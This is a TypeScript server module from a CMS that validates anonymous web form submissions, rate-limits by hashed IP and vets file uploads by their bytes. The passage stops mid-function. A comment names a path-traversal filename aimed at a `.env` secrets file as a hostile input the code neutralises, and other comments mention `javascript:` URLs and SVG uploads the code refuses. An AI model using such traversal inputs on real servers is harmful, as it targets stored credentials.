/**
 * What a stranger sent, and everything that decides whether it is kept
 * (`../../docs/specs/content-model/forms.md` phase 4).
 *
 * **This is the only place in Folio an anonymous request writes a row.** Every
 * other write path is behind `requireAccess`; `{base}/f/:id` is behind nothing at
 * all, because a form on a published page has to work for somebody who has never
 * heard of this CMS and has JavaScript switched off. So the posture here is the
 * opposite of the rest of the server: nothing that arrives is trusted, every
 * string is bounded before it reaches a column, and the size of what gets stored
 * is decided by the *form* rather than by whoever posted to it.
 *
 * Four properties are load-bearing and each is silent when it breaks:
 *
 * - **A submitter cannot forge a response's metadata.** `form_id`, `version`,
 *   `created_at`, `locale`, `page` and `ip_hash` are columns this file computes;
 *   `data` holds *declared field names only*, and a declared name can never begin
 *   with `RESERVED_PREFIX` because `validateFormFields` refuses one. So there is
 *   no key a submitter can send that lands anywhere but inside `data`, and none
 *   inside `data` that Folio also reads as metadata (decision 13).
 * - **The duplicate collapse is one statement.** `insert … select … where not
 *   exists` has no read-then-write pair for two clicks to race through, which is
 *   the property `consumeChallenge` gets the same way (decision 14).
 * - **The IP is hashed with the hour it arrived in** and the raw address is never
 *   stored, so the one quasi-identifier in the table stops being computable from
 *   a visitor's address as soon as that hour passes (decision 10).
 * - **Nothing here binds a caller-sized list.** Every statement binds a fixed
 *   number of parameters — thirteen at the widest — whatever the form holds and
 *   whatever arrived. A submitted response's field count *is* caller-influenced,
 *   so `data` is one bound JSON string rather than a column per answer, and the
 *   100-parameter ceiling (`db.ts`) is never in play.
 *
 * `FolioDb`, never `D1Database` (`db.ts`): the submit route is a POST, so
 * `withBindings` opens its session `PRIMARY_FIRST` and the duplicate check reads
 * what the previous click just wrote.
 */
import {
  type BulkOutcome,
  type BulkReport,
  type BulkSelection,
  type FilterSelection,
  readBulkCursor,
  writeBulkCursor,
} from '../core/bulk'
import {
  type FileAccept,
  FILE_ACCEPT,
  type FormField,
  type FormFieldKind,
  RESERVED_PREFIX,
} from '../core/forms'
import { clampLimit, decodeCursor, type Page, paginate } from '../core/pagination'
import { readCappedBody, safeFilename, sniffContentType } from './assets'
import { hashToken } from './auth/secrets'
import { bindChunks, type FolioDb } from './db'
import { FolioError, rethrow } from './errors'
import {
  deleteUploads,
  fileCap,
  type Form,
  type FormMeta,
  type ResponseFilter,
  uploadKeysOf,
} from './forms'
import { type Keyset, keysetWhere, orderBy, whereOf } from './keyset'
import {
  DOWNLOAD_CONTENT_TYPE,
  isPrintableAnswer,
  MAX_ANSWER_CHARS,
  MAX_SUBMISSION_KEYS,
} from './validate'

/* ------------------------------------------------------------- the body --- */

/**
 * A submitted body, before anything has decided what it means: every value the
 * request carried for a key, in the order it carried them.
 *
 * A list per key rather than a string, because `checkboxes` is the one question
 * a browser answers with the same `name` repeated — reading only the first would
 * silently store one tick out of five.
 */
export type SubmissionBody = ReadonlyMap<string, readonly string[]>

/**
 * The uploaded parts of a submission, keyed by the input's `name`. Separate from
 * `SubmissionBody` rather than a union inside it, so no reader can accidentally
 * treat a `File` as an answer — the `[object File]` failure has two ends and
 * this is the one that arrives.
 */
export type SubmissionFiles = ReadonlyMap<string, File>

/** A submission, read but not yet judged: the answers and the parts. */
export interface Submission {
  body: SubmissionBody
  files: SubmissionFiles
}

const NO_FILES: SubmissionFiles = new Map()

/** Characters allowed for per answer character, since a urlencoded body inflates
 *  a byte into up to three (`%E2`), and a multipart part carries a header. */
const BYTES_PER_CHAR = 4

/** What one answer is budgeted when its question sets no `max` of its own. */
const DEFAULT_ANSWER_CHARS = 2_000

/** An option value is capped at 120 characters by `validate.ts`, so a
 *  `checkboxes` question's whole answer is bounded by how many it offers. */
const OPTION_VALUE_CHARS = 120

/** A `number` or `date` answer, generously. */
const SCALAR_ANSWER_CHARS = 64

/**
 * Bytes allowed for everything that is not an answer: Folio's own hidden inputs,
 * the honeypot, the submit button's name, whatever a password manager added, and
 * multipart's boundaries.
 */
const FIXED_BODY_ALLOWANCE = 16 * 1024

/** Characters one question's answer can occupy, for the body cap. */
function answerBudget(field: FormField): number {
  switch (field.kind) {
    case 'select':
    case 'radio':
    case 'checkboxes':
      return Math.max(1, field.options?.length ?? 1) * OPTION_VALUE_CHARS
    case 'checkbox':
    case 'number':
    case 'date':
      return SCALAR_ANSWER_CHARS
    case 'statement':
      return 0
    default:
      return Math.min(field.max ?? DEFAULT_ANSWER_CHARS, MAX_ANSWER_CHARS)
  }
}

/**
 * The byte cap this form's submissions are read under (decision 15): the sum of
 * its questions' own caps plus a fixed allowance, **not** `MAX_UPLOAD_BYTES`.
 *
 * The difference is the whole point. A contact form with three text questions
 * budgets about thirty kilobytes; passing the asset route's 20MB would let a
 * stranger stream twenty megabytes into a Worker at a form that has nowhere to
 * put a single byte of it. The cap is derived from what the editor built, so it
 * grows when a question does and never because a request said so.
 *
 * A `file` question contributes its own `fileCap` — its `maxBytes` clamped to
 * the upload ceiling — so the cap is a form's own arithmetic and grows only when
 * an editor adds a question. `prepareUploads` re-checks the same number per
 * file, because this one bounds the *request* and that one bounds each *answer*:
 * without the second, a form with two 1MB questions would take a single 2MB CV.
 */
export function capFor(form: Form): number {
  let bytes = FIXED_BODY_ALLOWANCE
  for (const field of form.fields) {
    if (field.kind === 'file') {
      bytes += fileCap(field)
      continue
    }
    bytes += answerBudget(field) * BYTES_PER_CHAR
  }
  return bytes
}

function tooLarge(cap: number): FolioError {
  return new FolioError('too_large', `That submission is larger than ${cap} bytes.`)
}

/**
 * The request's bytes, under `capFor`'s ceiling and never past it.
 *
 * `content-length` is checked first so an honest oversized client is refused
 * before a byte is read, and `readCappedBody` (`assets.ts`) makes the cap real
 * for one that declared nothing — *"a declared length is only ever a claim"*.
 * Its refusal is re-worded here because its own message says "File", which is
 * the truth for an asset upload and a puzzle on a contact form.
 */
export async function readSubmissionBody(req: Request, cap: number): Promise<ArrayBuffer> {
  const declared = Number(req.headers.get('content-length'))
  if (Number.isFinite(declared) && declared > cap) throw tooLarge(cap)
  try {
    return await readCappedBody(req.body, cap)
  } catch (err) {
    if (err instanceof FolioError && err.code === 'too_large') throw tooLarge(cap)
    throw err
  }
}

/** Everything after the first `;`, lowercased: `multipart/form-data; boundary=…`. */
function contentTypeOf(req: Request): string {
  return (req.headers.get('content-type') ?? '').split(';')[0]!.trim().toLowerCase()
}

function tooManyKeys(): FolioError {
  return new FolioError(
    'bad_request',
    `A submission may carry ${MAX_SUBMISSION_KEYS} keys at most.`,
  )
}

/**
 * A `FormData` as a `Submission`: the typed answers in one map, the uploaded
 * parts in another.
 *
 * **A `File` never reaches the string channel.** `String(value)` on one is the
 * literal text `[object File]`, stored as somebody's answer with no error
 * anywhere — the same failure `enctype` on the descriptor exists to prevent,
 * arriving from the other end. Splitting the two at the parser is what makes
 * that unrepresentable rather than remembered.
 *
 * **The first part per name wins**, matching the text channel's `raw[0]`:
 * decision 15 is one file per question, so a second part under the same name is
 * either a client Folio did not describe or somebody testing the limits, and
 * neither is a reason to store two objects against one field.
 *
 * Both maps count against the same `MAX_SUBMISSION_KEYS` budget. They are two
 * maps built from one body, and a budget applied to each separately is twice the
 * budget.
 */
function fromFormData(data: FormData): Submission {
  const body = new Map<string, string[]>()
  const files = new Map<string, File>()
  for (const [key, value] of data) {
    if (typeof value !== 'string') {
      if (files.has(key)) continue
      if (body.size + files.size >= MAX_SUBMISSION_KEYS) throw tooManyKeys()
      files.set(key, value)
      continue
    }
    const existing = body.get(key)
    if (existing) existing.push(value)
    else {
      if (body.size + files.size >= MAX_SUBMISSION_KEYS) throw tooManyKeys()
      body.set(key, [value])
    }
  }
  return { body, files }
}

/**
 * A parsed JSON body as a `SubmissionBody`, so one validator serves both
 * transports (decision 5).
 *
 * Scalars become their string form and an array becomes the repeated-key shape a
 * browser would have sent; anything else — an object, a null, a nested array —
 * is dropped, because there is no question on any form whose answer is one.
 */
function fromJson(raw: unknown): SubmissionBody {
  if (!raw || typeof raw !== 'object' || Array.isArray(raw)) {
    throw new FolioError('bad_request', 'A JSON submission must be an object.')
  }
  const out = new Map<string, string[]>()
  for (const [key, value] of Object.entries(raw as Record<string, unknown>)) {
    if (out.size >= MAX_SUBMISSION_KEYS) throw tooManyKeys()
    if (typeof value === 'string') out.set(key, [value])
    else if (typeof value === 'number' && Number.isFinite(value)) out.set(key, [String(value)])
    else if (typeof value === 'boolean') out.set(key, [String(value)])
    else if (Array.isArray(value))
      out.set(
        key,
        value.filter((v) => typeof v === 'string'),
      )
  }
  return out
}

/**
 * The whole of reading a submission: the bytes under the form's cap, then one of
 * the two transports.
 *
 * The body is buffered *before* it is parsed, deliberately. `Request#formData()`
 * and `Request#json()` both read to completion with no cap of their own, so
 * calling either first would put an unbounded body in a Worker's memory and only
 * then discover how big it was.
 */
export async function readSubmission(req: Request, cap: number): Promise<Submission> {
  const bytes = await readSubmissionBody(req, cap)

  if (contentTypeOf(req) === 'application/json') {
    try {
      // **No files on this transport**, and that is not an omission. A JSON
      // submission would have to carry an upload base64-encoded inside an answer,
      // which would inflate it by a third against a cap the form derived, and
      // decision 5's whole point is that the native POST is the transport a form
      // is designed around. A script that needs to attach a file posts multipart
      // like a browser does.
      return { body: fromJson(JSON.parse(new TextDecoder().decode(bytes))), files: NO_FILES }
    } catch (err) {
      if (err instanceof FolioError) throw err
      throw new FolioError('bad_request', 'That submission was not valid JSON.')
    }
  }

  try {
    // The **whole** header, parameters included: `multipart/form-data` carries
    // its boundary there, and handing the parser the bare media type is a body
    // that reads as empty rather than as an error.
    const type = req.headers.get('content-type') ?? 'application/x-www-form-urlencoded'
    const data = await new Response(bytes, { headers: { 'content-type': type } }).formData()
    return fromFormData(data)
  } catch (err) {
    if (err instanceof FolioError) throw err
    throw new FolioError('bad_request', 'That submission could not be read as a form.')
  }
}

/** The raw body as `verify` receives it (decision 13): first value per key, so a
 *  host reads its widget's token under whatever name the widget chose. */
export function rawBodyOf(body: SubmissionBody): Record<string, string> {
  const out: Record<string, string> = {}
  for (const [key, values] of body) out[key] = values[0] ?? ''
  return out
}

/* --------------------------------------------------------- the validator --- */

/** What one answer is stored as. */
export type ResponseValue = string | number | boolean | readonly string[]

/**
 * Why one answer was refused. A token rather than a sentence: it rides in a JSON
 * body a script reads and, in the native transport, only the *names* travel at
 * all (decision 6) — so the prose a visitor sees is the host's, in the host's own
 * language, from its own markup.
 */
export type AnswerRefusal = 'required' | 'invalid' | 'too_long' | 'out_of_range'

export interface SubmissionResult {
  /** Declared questions only, keyed by field name. */
  values: Record<string, ResponseValue>
  /** Field name → why. Empty means the submission is good. */
  errors: Record<string, AnswerRefusal>
}

/** Loose on purpose: the strict test is a delivery attempt, and a form that
 *  refuses `a@b` refuses a real address somebody has. */
const EMAIL = /^[^@\s]+@[^@\s]+\.[^@\s]+$/
/** A calendar date as `<input type="date">` submits one. */
const DATE = /^\d{4}-\d{2}-\d{2}$/
/** A number as a person types one. `Number('12abc')` is `NaN` and `parseInt` is
 *  `12`; neither is what the visitor meant, so the shape is screened first. */
const NUMBER = /^[+-]?(\d+\.?\d*|\.\d+)([eE][+-]?\d+)?$/

/** The kinds whose answer may legitimately contain a line break. */
const MULTILINE: ReadonlySet<FormFieldKind> = new Set(['textarea'])

interface Answer {
  value?: ResponseValue
  error?: AnswerRefusal
}

/**
 * One text answer: bounded, screened, and checked against the question's own
 * `max` and `pattern`.
 *
 * The cap is the question's `max` **and** `MAX_ANSWER_CHARS`, never one of them:
 * a question with no `max` still may not carry ten thousand characters into a
 * column, and one whose `max` is larger than the backstop does not raise it.
 */
function textAnswer(field: FormField, raw: string): Answer {
  const value = MULTILINE.has(field.kind) ? raw.replace(/\r\n/g, '\n').trim() : raw.trim()
  if (value === '') return field.required ? { error: 'required' } : {}
  if (!isPrintableAnswer(value, MULTILINE.has(field.kind))) return { error: 'invalid' }

  const max = Math.min(field.max ?? MAX_ANSWER_CHARS, MAX_ANSWER_CHARS)
  // By code point, matching the cap `validate.ts` applies to everything else a
  // person types: `.length` counts a surrogate pair twice.
  if ([...value].length > max) return { error: 'too_long' }

  if (field.pattern !== undefined) {
    let re: RegExp | null = null
    // Compiled at save time by `validateFormFields`, so a throw here is
    // unreachable; a pattern that cannot compile screens nothing rather than
    // turning every submission into a 500.
    try {
      re = new RegExp(`^(?:${field.pattern})$`)
    } catch {
      re = null
    }
    if (re && !re.test(value)) return { error: 'invalid' }
  }
  return { value }
}

function optionValues(field: FormField): ReadonlySet<string> {
  return new Set((field.options ?? []).map((o) => o.value))
}

/**
 * One question against what arrived for it.
 *
 * **The switch is exhaustive**, the rule `resolveValue` sets in `core/resolve.ts`:
 * the default branch assigns to `never`, so a fourteenth field kind fails to
 * compile here rather than being silently unvalidated on a public endpoint —
 * which is the one place in this codebase where "handled by falling through" is a
 * security bug rather than a missing feature.
 */
function validateAnswer(field: FormField, raw: readonly string[], uploaded: boolean): Answer {
  const first = raw[0] ?? ''

  switch (field.kind) {
    // Renders no input and stores no answer. A key matching one is dropped
    // exactly like any other undeclared key (decision 13).
    case 'statement':
      return {}

    /**
     * **No value, and `required` is the whole of what this decides.** An upload
     * is not an answer in `data`: the bytes are an R2 object and the metadata is
     * the `files` column, so what reaches here is only the question "did an
     * acceptable file arrive for this field" — already answered by
     * `prepareUploads`, which is the async half and the one that knows about
     * bytes.
     *
     * The two have to arrive together. `required` without the upload would be
     * unenforceable, and the upload without `required` would make a compulsory
     * CV optional on a route where nobody is watching.
     */
    case 'file':
      return uploaded || !field.required ? {} : { error: 'required' }

    case 'checkbox': {
      // A browser sends the key only when the box is ticked, so presence is the
      // answer and `required` on one means "must be ticked".
      const ticked = raw.length > 0 && first !== '' && first !== 'false'
      if (field.required && !ticked) return { error: 'required' }
      return { value: ticked }
    }

    case 'checkboxes': {
      const allowed = optionValues(field)
      const ticked = raw.filter((v) => v !== '')
      if (ticked.some((v) => !allowed.has(v))) return { error: 'invalid' }
      // Nothing ticked sends no key at all, so `[]` is the honest answer and
      // `required` can only mean "at least one".
      if (ticked.length === 0) return field.required ? { error: 'required' } : { value: [] }
      return { value: [...new Set(ticked)] }
    }

    case 'select':
    case 'radio': {
      if (first === '') return field.required ? { error: 'required' } : {}
      return optionValues(field).has(first) ? { value: first } : { error: 'invalid' }
    }

    case 'number': {
      const text = first.trim()
      if (text === '') return field.required ? { error: 'required' } : {}
      if (text.length > SCALAR_ANSWER_CHARS || !NUMBER.test(text)) return { error: 'invalid' }
      const value = Number(text)
      if (!Number.isFinite(value)) return { error: 'invalid' }
      if (field.min !== undefined && value < field.min) return { error: 'out_of_range' }
      if (field.max !== undefined && value > field.max) return { error: 'out_of_range' }
      return { value }
    }

    case 'date': {
      const text = first.trim()
      if (text === '') return field.required ? { error: 'required' } : {}
      if (!DATE.test(text)) return { error: 'invalid' }
      // `2026-02-31` matches the shape and is not a day. `Date.parse` of an
      // ISO date is UTC midnight, so the round trip is exact.
      const parsed = new Date(`${text}T00:00:00Z`)
      if (Number.isNaN(parsed.getTime()) || parsed.toISOString().slice(0, 10) !== text) {
        return { error: 'invalid' }
      }
      return { value: text }
    }

    case 'email': {
      const answer = textAnswer(field, first)
      if (answer.error || answer.value === undefined) return answer
      return EMAIL.test(String(answer.value)) ? answer : { error: 'invalid' }
    }

    case 'url': {
      const answer = textAnswer(field, first)
      if (answer.error || answer.value === undefined) return answer
      try {
        const url = new URL(String(answer.value))
        // http(s) only: a stored `javascript:` or `data:` answer is a link a
        // host's markup would happily render.
        if (url.protocol !== 'http:' && url.protocol !== 'https:') return { error: 'invalid' }
      } catch {
        return { error: 'invalid' }
      }
      return answer
    }

    // A `hidden` question stores what the markup emitted rather than the value
    // the builder typed: that is the whole of decision 13's "a host that wants to
    // pass its own value declares a hidden field for it", and it is validated,
    // bounded and exported like any other answer.
    case 'hidden':
    case 'text':
    case 'textarea':
    case 'tel':
      return textAnswer(field, first)

    default: {
      const never: never = field.kind
      throw new Error(`forms: unhandled field kind ${String(never)}`)
    }
  }
}

/**
 * Every declared question against what arrived, and nothing else
 * (decision 13).
 *
 * Pure — a field list and a body in, values and per-field refusals out — so the
 * hardest-to-reason-about half of a public write path is unit-tested in Node
 * rather than only through workerd.
 *
 * Two rules run before any question is looked at, and both are screens rather
 * than validations:
 *
 * - **Only declared names are read.** The submit button's `name`, the honeypot,
 *   whatever a password manager injected and whatever a captcha widget called
 *   its own input are all simply not asked for. A 422 on an undeclared key was
 *   rejected: it breaks the first time a `<button name="submit">` appears.
 * - **A `_`-prefixed name is Folio's** and can never be an answer. It cannot
 *   collide with a declared name either, because `validateFormFields` refuses a
 *   field slug in that namespace — so this is the second of two locks on the same
 *   door, and the one that holds if a stored row ever predates the first.
 *
 * `uploaded` is the set of field names `prepareUploads` accepted a file for, and
 * it is the only thing this function knows about bytes. Defaulted to empty so
 * every text-only caller — and every test of one — reads unchanged.
 */
export function validateSubmission(
  fields: readonly FormField[],
  body: SubmissionBody,
  uploaded: ReadonlySet<string> = new Set(),
): SubmissionResult {
  const values: Record<string, ResponseValue> = {}
  const errors: Record<string, AnswerRefusal> = {}

  for (const field of fields) {
    if (field.name.startsWith('_')) continue
    const { value, error } = validateAnswer(
      field,
      body.get(field.name) ?? [],
      uploaded.has(field.name),
    )
    if (error) errors[field.name] = error
    else if (value !== undefined) values[field.name] = value
  }

  return { values, errors }
}

/* -------------------------------------------------------------- hashing --- */

/** The window an identical submission collapses inside (decision 14). */
export const DUPLICATE_WINDOW_MS = 60 * 1000

/** The window the per-IP-hash limit counts over, and the width of one hash
 *  bucket. `challenges.ts`'s `RATE_WINDOW_MS`, for the same reason. */
export const RATE_WINDOW_MS = 60 * 60 * 1000

export const DEFAULT_RATE_PER_HOUR = 10
export const MIN_RATE_PER_HOUR = 1
export const MAX_RATE_PER_HOUR = 100

/** What `body_hash` covers for one uploaded file. `contentHash` is the bytes,
 *  which is what lets the duplicate check run *before* the R2 put (decision 14). */
export interface FilePart {
  field: string
  size: number
  contentHash: string
}

/**
 * The fingerprint the sixty-second duplicate collapse compares.
 *
 * Canonical by construction: keys sorted, values in their stored form, files by
 * field name — so two identical submissions hash identically however the browser
 * happened to order the parts, and a genuine second submission a minute later
 * does not.
 *
 * `hashToken` (`auth/secrets.ts`) is the codebase's one SHA-256-to-hex, and this
 * is not a secret in the sense that file's header means — it hashes a body, not a
 * credential — but a third implementation of the same digest is worth less than
 * the slightly odd import.
 */
export function bodyHash(
  values: Record<string, ResponseValue>,
  files: readonly FilePart[] = [],
): Promise<string> {
  const answers = Object.keys(values)
    .sort()
    .map((key) => [key, values[key]])
  const parts = [...files]
    .sort((a, b) => (a.field < b.field ? -1 : a.field > b.field ? 1 : 0))
    .map((f) => [f.field, f.size, f.contentHash])
  return hashToken(JSON.stringify([answers, parts]))
}

/**
 * The visitor's address, as Cloudflare's own edge reports it.
 *
 * **`CF-Connecting-IP` and nothing else.** The edge sets it on every request and
 * overwrites whatever the client sent, which is what makes it worth hashing;
 * `X-Forwarded-For` is a header a submitter writes, so limiting on it would be
 * limiting a value the limited party chooses. Absent is a local `wrangler dev` or
 * a direct hit, and the honest answer there is "no address", not a shared bucket
 * everybody lands in.
 */
export function clientIp(req: Request): string | null {
  const raw = req.headers.get('cf-connecting-ip')
  if (!raw) return null
  const ip = raw.trim()
  // A bound rather than a format check: this is hashed, never parsed or
  // compared, so the only thing that matters is that it cannot be enormous.
  return ip.length > 0 && ip.length <= 64 ? ip : null
}

/**
 * `sha256(ip : form_id : hour)` (decision 10). The raw address is never stored
 * and never leaves this function.
 *
 * The form id makes the same visitor unlinkable across two forms on one site.
 * The hour bucket is what makes the value expire without a sweep: once that hour
 * has passed nobody holding the database can compute it from an address again,
 * because the preimage nobody would think to try is the one that is gone.
 */
export function ipHash(ip: string, formId: string, at: number): Promise<string> {
  return hashToken(`${ip}:${formId}:${Math.floor(at / RATE_WINDOW_MS)}`)
}

/**
 * The current bucket's hash and the previous one's (decision 10).
 *
 * Both, because a single bucket is not a rate limit: ten submissions at 10:58
 * and an eleventh at 11:01 are eleven in three minutes and two different hashes.
 * Counting either against a rolling hour makes the window true at the cost of one
 * extra bind. The first is the hash the new row is stored under.
 */
export function throttleHashes(ip: string, formId: string, now: number): Promise<[string, string]> {
  return Promise.all([
    ipHash(ip, formId, now),
    ipHash(ip, formId, now - RATE_WINDOW_MS),
  ]) as Promise<[string, string]>
}

/**
 * How many responses either bucket has collected in the last hour.
 *
 * Three binds, never a caller-sized list, and served by `form_responses_throttle`
 * — the partial index, which holds only the rows with an address behind them.
 * Like `recentChallengeCount`, this is a *partial* answer and says so: it bounds
 * a script, not a botnet.
 */
export async function recentSubmissionCount(
  db: FolioDb,
  hashes: readonly [string, string],
  now: number = Date.now(),
): Promise<number> {
  const row = await db
    .prepare('select count(*) as n from form_responses where ip_hash in (?, ?) and created_at > ?')
    .bind(hashes[0], hashes[1], now - RATE_WINDOW_MS)
    .first<{ n: number }>()
  return row?.n ?? 0
}

/* --------------------------------------------------------------- uploads --- */

/**
 * The prefix every stranger's upload is keyed under (decision 15).
 *
 * **`{base}/asset/:key` physically cannot serve one**, and that is the whole
 * design rather than a guard somebody has to remember: `ASSET_KEY`
 * (`validate.ts`) is anchored to `^ast_[0-9a-f]{12}-…`, so a `sub_` key is a 400
 * from the parameter validator before any handler runs. There is no new refusal,
 * so there is no new refusal to forget — and the two routes are one letter apart
 * in a way that a screen-by-charset would have made indistinguishable.
 */
export const UPLOAD_PREFIX = 'sub_'

/**
 * Which half of the `accept` menu a file belongs to.
 *
 * A family rather than an exact type, because the bytes of a `.docx` and an
 * `.xlsx` are the same ZIP container and no cheap signature tells them apart.
 * The gate is on the family — which the bytes *do* establish — and the exact
 * label is decided afterwards by `labelFor`.
 */
export type UploadFamily = 'images' | 'documents'

/** What one `accept` token admits. `both` is the union, which is what it says. */
const ACCEPTS: Record<FileAccept, readonly UploadFamily[]> = {
  documents: ['documents'],
  images: ['images'],
  both: ['documents', 'images'],
}

export interface SniffedUpload {
  family: UploadFamily
  /** The exact type, when the bytes name one. Null when they establish only the
   *  family — a ZIP that is an Office package, an OLE compound file. */
  contentType: string | null
}

/** How far into a file the text screen looks. Long enough that a real text file
 *  is obviously one, short enough that this is a header check on a 20MB body. */
const TEXT_SNIFF_BYTES = 8192

const starts = (bytes: Uint8Array, signature: readonly number[]): boolean =>
  bytes.length >= signature.length && signature.every((byte, i) => bytes[i] === byte)

/** `%PDF-`. */
const PDF = [0x25, 0x50, 0x44, 0x46, 0x2d]
/** A ZIP local file header, which every Office Open XML package opens with. */
const ZIP = [0x50, 0x4b, 0x03, 0x04]
/** The OLE2 compound file signature: a legacy `.doc` or `.xls`. */
const OLE2 = [0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]
/** The name of an OOXML package's first entry, at the fixed offset a ZIP local
 *  header puts a name at. What tells a `.docx` from an arbitrary archive. */
const OOXML_ENTRY = '[Content_Types].xml'
const OOXML_ENTRY_OFFSET = 30

function isOoxml(bytes: Uint8Array): boolean {
  const end = OOXML_ENTRY_OFFSET + OOXML_ENTRY.length
  if (bytes.length < end) return false
  let name = ''
  for (let i = OOXML_ENTRY_OFFSET; i < end; i++) name += String.fromCharCode(bytes[i]!)
  return name === OOXML_ENTRY
}

/**
 * Whether the head of the file reads as text.
 *
 * A byte scan rather than a decode: `text/plain` is the one member of the
 * `documents` menu with no signature at all, so "is it text" has to be a
 * property of the bytes instead of a prefix match. A NUL or a stray C0 control
 * is what every binary format this does not already recognise carries in its
 * first few kilobytes, and no text file has one — tab, newline and carriage
 * return excepted, which is the same set `isPrintableAnswer` admits for a
 * `textarea`.
 *
 * Deliberately **not** a UTF-8 validity check: a Latin-1 CSV somebody exported
 * from a spreadsheet in 2009 is still a text file, and refusing it would be
 * refusing a real document over an encoding nothing here decodes.
 */
function looksLikeText(bytes: Uint8Array): boolean {
  const end = Math.min(bytes.length, TEXT_SNIFF_BYTES)
  if (end === 0) return false
  for (let i = 0; i < end; i++) {
    const byte = bytes[i]!
    if (byte === 0x09 || byte === 0x0a || byte === 0x0d) continue
    if (byte < 0x20 || byte === 0x7f) return false
  }
  return true
}

/**
 * What the file **is**, from its own bytes (decision 15).
 *
 * **The submitter's `Content-Type` is not consulted here at all**, and that is
 * the point: it is a string a stranger typed, so a form that gated on it would
 * be gated on nothing. `sniffContentType` (`assets.ts`) answers the image half
 * unchanged — it is already the codebase's one magic-byte reader and already
 * checks each signature's full length — and the document half is added here
 * rather than there because the media library has no use for it: an asset that
 * is not an inline-servable image is stored as a download whatever it is, so
 * `assets.ts` never needed to tell a PDF from a `.docx`.
 *
 * `null` means *nothing recognised it*, which is a refusal rather than a
 * fallback. That is the one place this departs from `uploadAsset`, which stores
 * an unrecognised upload as `application/octet-stream`: an editor uploading to
 * their own library gets the benefit of the doubt, and an anonymous stranger
 * posting bytes at a public endpoint does not.
 *
 * **AVIF and SVG are refused for an `images` question**, because neither is in
 * `FILE_ACCEPT.images` — the menu is the contract, and SVG in particular is
 * attacker-supplied XML that nothing here has a reason to accept.
 */
export function sniffUpload(bytes: Uint8Array): SniffedUpload | null {
  const image = sniffContentType(bytes)
  if (image) {
    return FILE_ACCEPT.images.includes(image) ? { family: 'images', contentType: image } : null
  }
  if (starts(bytes, PDF)) return { family: 'documents', contentType: 'application/pdf' }
  if (starts(bytes, OLE2)) return { family: 'documents', contentType: null }
  if (starts(bytes, ZIP)) return isOoxml(bytes) ? { family: 'documents', contentType: null } : null
  if (looksLikeText(bytes)) return { family: 'documents', contentType: 'text/plain' }
  return null
}

/**
 * What gets stored in the `files` column's `contentType`.
 *
 * **A claim may label a file; it may never admit one.** The family is already
 * settled by the bytes, so where they do not name an exact type the submitter's
 * own header is allowed to choose between the members of that family — which
 * `.docx` a ZIP is — and nothing else. A header naming a type outside the family
 * the bytes established, or outside the menu entirely, is discarded for
 * `application/octet-stream`.
 *
 * The stakes are low by construction and that is deliberate: the download route
 * answers `application/octet-stream` whatever this says, so a wrong label is a
 * wrong word in the admin's detail drawer rather than a served content type.
 */
function labelFor(sniffed: SniffedUpload, declared: string): string {
  if (sniffed.contentType) return sniffed.contentType
  const claim = (declared || '').split(';')[0]!.trim().toLowerCase()
  return FILE_ACCEPT[sniffed.family].includes(claim) ? claim : DOWNLOAD_CONTENT_TYPE
}

/**
 * `sub_<12 hex>-<safeFilename>` (decision 15).
 *
 * **The stranger's filename never decides the path.** It rides along after a
 * minted prefix so a download keeps its name and a support request can quote it,
 * and it goes through `assets.ts`'s one `safeFilename` first, which drops every
 * path segment and reduces what is left to `[a-z0-9.-]`. Two submitters
 * uploading `cv.pdf` therefore collide with nothing, and one submitting
 * `../../../.env` writes to a key that reads as `.env` and nothing else.
 */
export function newUploadKey(filename: string): string {
  return `${UPLOAD_PREFIX}${crypto.randomUUID().replace(/-/g, '').slice(0, 12)}-${safeFilename(filename)}`
}

/** One upload that passed every check, with its bytes still in hand. */
export interface PreparedUpload extends SubmittedFile {
  bytes: ArrayBuffer
  /** SHA-256 of the bytes. What makes `body_hash` cover the file, and therefore
   *  what lets the duplicate check run before the put (decision 14). */
  contentHash: string
}

const HEX = '0123456789abcdef'

async function hashBytes(bytes: ArrayBuffer): Promise<string> {
  const digest = new Uint8Array(await crypto.subtle.digest('SHA-256', bytes))
  let out = ''
  for (const byte of digest) out += HEX[byte >> 4]! + HEX[byte & 15]!
  return out
}

export interface PreparedUploads {
  files: PreparedUpload[]
  /** Field name → why its file was refused. Merged over the text validator's
   *  own errors by the caller, so a too-large file on a required question reads
   *  as `too_long` rather than as `required`. */
  errors: Record<string, AnswerRefusal>
}

/**
 * Every declared `file` question against the parts that arrived: bounded,
 * sniffed, hashed, keyed — and **nothing put to R2** (decision 14).
 *
 * The order inside the loop is the design, and each step is ahead of the next
 * because being behind it would cost something that cannot be taken back:
 *
 *  1. **A part under an undeclared name is never read.** The loop walks the
 *     form's questions, not the request's parts, so a stranger cannot make the
 *     server buffer an attachment for a field that does not exist (decision 13).
 *  2. **An empty part is no part at all.** A browser sends `filename=""` with
 *     zero bytes for a file input nobody touched, so treating that as a file
 *     would store an empty object for every visitor who left it alone — and
 *     treating it as an *error* would make every optional file question
 *     effectively required.
 *  3. **The size is checked before the bytes are held**, against `fileCap`'s
 *     clamped per-question number. `capFor` already bounded the whole request,
 *     but a form with two 1MB questions must not accept one 2MB file.
 *  4. **The bytes decide the type**, never the header (`sniffUpload`).
 *  5. **The question's `accept` gates the family.** This is the check the
 *     editor thinks they are configuring, and it is worth nothing if it runs
 *     against a `Content-Type` a stranger wrote.
 *  6. **The hash, then the key.** The hash is what `bodyHash` folds in, which
 *     is what lets the duplicate collapse happen before anything is written.
 *
 * A refusal is per field and the caller answers `invalid` with the names, so a
 * visitor who attached the wrong thing is told which question to look at and
 * nothing else about why — the same shape every other answer's refusal takes.
 */
export async function prepareUploads(
  fields: readonly FormField[],
  parts: SubmissionFiles,
): Promise<PreparedUploads> {
  const files: PreparedUpload[] = []
  const errors: Record<string, AnswerRefusal> = {}

  for (const field of fields) {
    if (field.kind !== 'file' || field.name.startsWith('_')) continue
    const part = parts.get(field.name)
    if (!part || part.size === 0) continue

    const cap = fileCap(field)
    if (part.size > cap) {
      errors[field.name] = 'too_long'
      continue
    }

    const bytes = await part.arrayBuffer()
    // `File.size` is what the parser measured and `byteLength` is what it
    // handed over; they agree, and checking the second is what makes the cap a
    // property of the bytes rather than of a number reported alongside them.
    if (bytes.byteLength === 0 || bytes.byteLength > cap) {
      if (bytes.byteLength > cap) errors[field.name] = 'too_long'
      continue
    }

    const sniffed = sniffUpload(new Uint8Array(bytes))
    if (!sniffed || !ACCEPTS[field.accept ?? 'both'].includes(sniffed.family)) {
      errors[field.name] = 'invalid'
      continue
    }

    const filename = safeFilename(part.name)
    files.push({
      field: field.name,
